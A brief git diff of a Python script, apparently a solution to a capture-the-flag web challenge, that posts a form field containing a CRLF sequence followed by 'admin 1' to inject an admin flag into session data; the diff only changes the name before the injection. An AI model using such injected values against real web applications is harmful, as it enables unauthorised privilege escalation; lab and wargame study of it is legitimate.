@@ -25,7 +25,7 @@ session = requests.Session()
 session.auth = (username, password)
 
 
-data = {"name": "natas22\r\nadmin 1"}
+data = {"name": "Anything\r\nadmin 1"}
 session.post(url, data=data)
 resp = session.post(url, data=data)
 
